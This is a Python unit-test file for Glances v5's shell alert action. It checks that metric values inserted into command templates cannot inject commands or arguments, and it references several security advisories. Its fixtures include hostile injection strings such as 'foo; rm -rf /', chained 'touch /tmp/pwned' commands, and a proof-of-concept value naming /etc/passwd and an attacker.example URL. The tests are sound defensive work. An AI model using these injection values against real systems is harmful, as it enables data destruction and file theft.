#!/usr/bin/env python
#
# Glances - An eye on your system
#
# SPDX-FileCopyrightText: 2026 Nicolas Hennion <nicolas@nicolargo.com>
#
# SPDX-License-Identifier: LGPL-3.0-only
#

"""Glances v5 — unit tests for the shell `GlancesActionBase` subclass.

The assertions bear on the argv handed to `Popen`, never on an intermediate
rendered string: the string `secure_popen` receives is the trusted template,
the untrusted values are expanded per argument further down
(GHSA-56xw-p9qm-r437). A string-level assertion would pass for the wrong
reason.
"""

from __future__ import annotations

import logging
from unittest.mock import MagicMock, patch

import chevron
import pytest

from glances.actions_v5.shell import ShellAction

# ---------------------------------------------------------- helpers


class _FakeProcess:
    """Minimal Popen stand-in: no output, no exit status."""

    def __init__(self) -> None:
        self.stdout = MagicMock()

    def communicate(self, timeout=None) -> tuple[bytes, bytes]:
        return (b"", b"")

    def wait(self, timeout=None) -> int:
        return 0


async def _capture_argv(action, plugin_name, level, context, template, repeat=False):
    """Run the action and return the argv of every process that was spawned."""
    argv_list = []

    def fake_popen(argv, **kwargs):
        argv_list.append(argv)
        return _FakeProcess()

    with patch("glances.secure.Popen", side_effect=fake_popen):
        await action.execute(plugin_name, level, context, template, repeat=repeat)

    return argv_list


@pytest.fixture
def shell_action() -> ShellAction:
    return ShellAction()


# ---------------------------------------------------------- contract


def test_action_name_is_action(shell_action):
    assert shell_action.action_name == "action"


def test_is_available_true(shell_action):
    assert shell_action.is_available() is True


# ---------------------------------------------------------- render & exec


async def test_renders_simple_template_and_executes(shell_action):
    argv_list = await _capture_argv(shell_action, "mem", "warning", {"percent": 75.0}, "echo {{percent}}")
    assert argv_list == [["echo", "75.0"]]


async def test_builtin_variables_substituted(shell_action):
    argv_list = await _capture_argv(
        shell_action,
        "mem",
        "critical",
        {
            "percent": 95.0,
            "_glances_hostname": "myhost",
            "_glances_plugin": "mem",
            "_glances_level": "critical",
            "_glances_timestamp": "2026-05-11T10:00:00+00:00",
        },
        "logger glances-{{_glances_plugin}}-{{_glances_level}}: {{percent}}",
    )
    assert argv_list == [["logger", "glances-mem-critical:", "95.0"]]


async def test_shell_metacharacters_cannot_start_a_command(shell_action):
    """A malicious metric value cannot break out of its argument (CVE-2026-32608).

    `secure_popen` splits the template before the value exists, so the `;`
    never reaches a lexer that would treat it as a separator.
    """
    malicious = "foo; rm -rf /"
    argv_list = await _capture_argv(shell_action, "containers", "critical", {"name": malicious}, "logger {{name}}")
    assert argv_list == [["logger", malicious]]


async def test_nested_list_value_reaches_one_argument(shell_action):
    """A nested (list) context value cannot smuggle a shell operator.

    v4 fixed this by recursing its operator-stripping sanitizer into lists
    (GHSA-73wf-9vmv-5pv9). Splitting before rendering makes the whole class
    impossible: the stringified list is a single argument whatever it holds.
    """
    # `cmdline` is the argv list an attacker can set on their own process.
    argv_list = await _capture_argv(
        shell_action,
        "processlist",
        "warning",
        {"cmdline": ["python", "-c", "x && touch /tmp/pwned"]},
        "logger {{cmdline}}",
    )
    assert len(argv_list) == 1
    assert len(argv_list[0]) == 2
    assert "touch /tmp/pwned" in argv_list[0][1]


async def test_adjacent_unescaped_variables_cannot_reconstruct_operator(shell_action):
    """Two adjacent variables whose values touch cannot form a real `&&`.

    v4 added a lone `&` to its operator blocklist because per-field
    sanitization left `{{{a}}}{{{b}}}` able to join a trailing and a leading
    `&` across the boundary (GHSA-qcpp-8x79-hhp3). Here the `&&` is
    reconstructed, but only inside an argument that was already delimited, so
    it is inert. Uses triple braces (unescaped) — the worst case.
    """
    argv_list = await _capture_argv(
        shell_action,
        "processlist",
        "warning",
        {"a": "foo&", "b": "&touch /tmp/pwned #"},
        "logger {{{a}}}{{{b}}}",
    )
    # A single process, and both values in the same single argument
    assert argv_list == [["logger", "foo&&touch /tmp/pwned #"]]


async def test_result_is_logged_at_debug(shell_action, caplog):
    """`secure_popen` does not expose the return code, so the command output
    (or its stderr) is what gets logged, at debug level."""
    with caplog.at_level(logging.DEBUG, logger="glances.actions_v5.shell"):
        await shell_action.execute("mem", "warning", {}, "echo -n RESULT", repeat=True)
    assert "RESULT" in caplog.text
    # `repeat` is carried in that same line
    assert "repeat=True" in caplog.text


async def test_subprocess_exception_is_logged_not_raised(shell_action, caplog):
    """OSError during subprocess startup is captured, not propagated."""
    with (
        patch("glances.secure.Popen", side_effect=OSError("fork failed")),
        caplog.at_level(logging.WARNING),
    ):
        await shell_action.execute("mem", "warning", {}, "some-cmd")
    assert "execution failed" in caplog.text


async def test_template_render_error_is_logged_and_skips_exec(shell_action, caplog):
    """A Mustache section spanning two arguments cannot be rendered per
    argument: log a warning and never spawn anything."""
    argv_list = []
    with caplog.at_level(logging.WARNING):
        argv_list = await _capture_argv(
            shell_action,
            "processlist",
            "warning",
            {"cmdline": ["x", "y"]},
            "logger {{#cmdline}}{{.}} {{/cmdline}}",
        )
    assert argv_list == []
    assert "template render failed" in caplog.text


async def test_section_within_one_argument_is_rendered(shell_action):
    """A section that opens and closes inside the same argument still works."""
    argv_list = await _capture_argv(
        shell_action,
        "processlist",
        "warning",
        {"cmdline": ["a b", "c'd"]},
        "logger {{#cmdline}}{{.}},{{/cmdline}}",
    )
    assert argv_list == [["logger", "a b,c'd,"]]


# --------------------------------------------- argument / command injection
#
# GHSA-56xw-p9qm-r437 (CWE-88) in v4, plus the v5-only CWE-78 variant: v5 used
# to pre-quote the values with shlex.quote() and hand the result to a real
# shell, but chevron's default {{var}} syntax HTML-escapes `" < > &` and so
# rewrote the very quotes shlex.quote had emitted, leaving live `&` operators
# in the command line. Splitting before rendering removes both.

_POC_VALUE = "/mnt/usb/x' --evil-flag /etc/passwd http://attacker.example/leak 'y"


async def test_poc_single_quoted_field_stays_one_argument(shell_action):
    argv_list = await _capture_argv(
        shell_action,
        "fs",
        "critical",
        {"mnt_point": _POC_VALUE, "percent": "92"},
        "argv_logger.py '{{mnt_point}}' {{percent}}",
    )
    assert argv_list == [["argv_logger.py", _POC_VALUE, "92"]]


async def test_unquoted_field_with_spaces_stays_one_argument(shell_action):
    """The pattern documented in docs/aoa/actions.rst is unquoted, and a plain
    space in the value was enough to inject argv tokens."""
    value = "/mnt/x --evil-flag /etc/passwd"
    argv_list = await _capture_argv(
        shell_action,
        "fs",
        "critical",
        {"mnt_point": value, "percent": "92"},
        "argv_logger.py {{mnt_point}} {{percent}}",
    )
    assert argv_list == [["argv_logger.py", value, "92"]]


async def test_triple_mustache_stays_one_argument(shell_action):
    argv_list = await _capture_argv(
        shell_action,
        "fs",
        "critical",
        {"mnt_point": _POC_VALUE, "percent": "92"},
        "argv_logger.py {{{mnt_point}}} {{percent}}",
    )
    assert argv_list == [["argv_logger.py", _POC_VALUE, "92"]]


async def test_empty_value_yields_an_empty_argument(shell_action):
    """An empty field keeps its argv slot, so emptying a value cannot shift the
    positional arguments of the invoked script."""
    argv_list = await _capture_argv(
        shell_action,
        "fs",
        "critical",
        {"mnt_point": "", "percent": "92"},
        "argv_logger.py {{mnt_point}} {{percent}}",
    )
    assert argv_list == [["argv_logger.py", "", "92"]]


@pytest.mark.parametrize(
    "template",
    [
        "echo {{mnt_point}}",  # documented, unquoted
        'echo "{{mnt_point}}"',  # the shipped conf/glances.conf examples
        "echo {{{mnt_point}}}",  # raw form
    ],
)
async def test_value_cannot_execute_a_second_command(shell_action, tmp_path, template):
    """End-to-end: no mock, a real process. The injected command must not run.

    This is the v5-only CWE-78 variant — with the previous implementation the
    unquoted case created the sentinel.
    """
    sentinel = tmp_path / "pwned"
    await shell_action.execute("fs", "critical", {"mnt_point": f"x' ; touch {sentinel} ; '"}, template)
    assert not sentinel.exists()


# ------------------------------------------------- --disable-config-exec
#
# CVE-2026-68519: the hardening flag must cover the on-alert action commands,
# which are read from the same glances.conf as the AMP commands. What the flag
# adds is that the operator's OWN config line can no longer chain, pipe or
# redirect.


def test_default_config_exec_is_allowed(shell_action):
    """Conservative default: no config, no flag -> operators interpreted."""
    assert shell_action.allow_operators() is True


def test_flag_disables_operators(config_with):
    action = ShellAction(config_with({"global": {"disable_config_exec": "true"}}))
    assert action.allow_operators() is False


async def test_disabled_runs_as_a_single_process(config_with):
    action = ShellAction(config_with({"global": {"disable_config_exec": "true"}}))
    argv_list = await _capture_argv(action, "mem", "warning", {"percent": 75.0}, "echo {{percent}}")
    assert argv_list == [["echo", "75.0"]]


async def test_disabled_makes_operators_literal(config_with, tmp_path):
    """The operator in the operator's OWN config line is not interpreted."""
    sentinel = tmp_path / "pwned"
    action = ShellAction(config_with({"global": {"disable_config_exec": "true"}}))
    await action.execute("mem", "warning", {}, f"echo hello > {sentinel}")
    assert not sentinel.exists()


async def test_enabled_still_interprets_operators(config_with, tmp_path):
    """Non-regression: the default behaviour is unchanged."""
    sentinel = tmp_path / "written"
    action = ShellAction(config_with({"global": {}}))
    await action.execute("mem", "warning", {"name": "disk 1"}, f"echo -n {{{{name}}}} > {sentinel}")
    assert sentinel.exists()
    # …and the templated value reaches the file whole, spaces included
    assert sentinel.read_text() == "disk 1"


async def test_enabled_still_pipes(config_with):
    action = ShellAction(config_with({"global": {}}))
    argv_list = await _capture_argv(action, "mem", "warning", {"n": "foo bar"}, "echo {{n}} | grep {{n}}")
    assert argv_list == [["echo", "foo bar"], ["grep", "foo bar"]]


async def test_protection_holds_with_disable_config_exec(config_with):
    """The hardened path uses the same tokenizer and must be protected too."""
    action = ShellAction(config_with({"global": {"disable_config_exec": "true"}}))
    argv_list = await _capture_argv(
        action,
        "fs",
        "critical",
        {"mnt_point": _POC_VALUE, "percent": "92"},
        "argv_logger.py '{{mnt_point}}' {{percent}}",
    )
    assert argv_list == [["argv_logger.py", _POC_VALUE, "92"]]


def test_chevron_error_is_the_caught_template_error():
    """Guard the `except chevron.ChevronError` clause: chevron raises that type
    for a tag left unclosed inside an argument."""
    with pytest.raises(chevron.ChevronError):
        chevron.render("{{#section}}{{.}}", {"section": ["x"]})
